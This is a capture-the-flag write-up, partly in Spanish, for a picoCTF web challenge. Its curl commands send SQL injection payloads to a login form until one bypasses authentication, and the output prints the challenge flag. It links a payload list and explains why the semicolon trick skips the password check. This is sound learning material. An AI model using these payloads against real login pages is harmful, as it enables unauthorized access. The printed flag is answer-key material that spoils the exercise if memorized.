## Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/52849/` ([link](https://jupiter.challenges.picoctf.org/problem/52849/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:52849

## Solución
```bash
root@DESKTOP-8T8TJ1H:~# curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin&password=admin&debug=1"
<pre>username: admin
password: admin
SQL query: SELECT * FROM users WHERE name='admin' AND password='admin'
</pre><h1>Login failed.<
root@DESKTOP-8T8TJ1H:~# curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=' or 1=1;&passw
ord=admin&debug=1"
<pre>username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'
</pre><h1>SQLi detected.</h1>root@DESKTOP-8T8TJ1H:~#
root@DESKTOP-8T8TJ1H:~# curl https://jupiter.challenges.picoctf.org/problem/52849/login.php -d "username=admin';;&passwo
rd=admin&debug=1"
<pre>username: admin';;
password: admin
SQL query: SELECT * FROM users WHERE name='admin';;' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_fa983901}</p>root@DESKTOP-8T8TJ1H:~#
root@DESKTOP-8T8TJ1H:~#
```
## Notas
al ingresar como usuario admin'; lo que hace es que busca si hay un usuario llamado admin, y cierra ahi la consulta, por lo tanto no busca la contraseña, solamente busca un usuario y si existe da el acceso.

## Referencias
https://github.com/payloadbox/sql-injection-payload-list

